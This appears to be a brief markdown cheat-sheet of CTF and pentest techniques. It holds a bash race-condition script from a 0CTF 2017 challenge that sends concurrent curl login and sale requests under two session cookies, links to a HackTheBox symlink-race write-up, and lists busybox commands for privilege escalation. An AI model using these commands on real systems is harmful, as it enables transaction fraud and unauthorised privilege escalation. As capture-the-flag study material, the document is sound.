# racing, race-condition

```bash
username=
password=
cookie1="PHPSESSID=3k21rt4acut215r1adlrq5m0p0"
cookie2="PHPSESSID=ck8pgb52nkkb8sdg2c95ms7s16"
url="http://202.120.7.197/app.php"

curl "$url?action=login" -b $cookie1 -d "username=$username&pwd=$password" &\
curl "$url?action=login" -b $cookie2 -d "username=$username&pwd=$password"

curl "$url?action=buy&id=1" -b $cookie1

curl "$url?action=sale&id=1" -b $cookie1 &\
curl "$url?action=sale&id=1" -b $cookie2
```
    - [Temmo's Tiny Shop - 0CTF 2017](https://www.40huo.cn/blog/0ctf-2017-writeup.html)

### symlink

- [Book \- HackThebox | Samir Ettali](https://samirettali.com/writeups/hackthebox/book/)
    - https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition

# priviledge escalation

- https://gtfobins.github.io
- busybox - act as arbitrary file
    ```bash
    # if owner of file, can use chmod to fix permissions
    upx -o /tmp/chmod /bin/busybox
    # || tar
    # || /lib/ld-musl-x86_64.so.1 /bin/busybox cat
    # || setpriv /bin/busybox cat
    ```
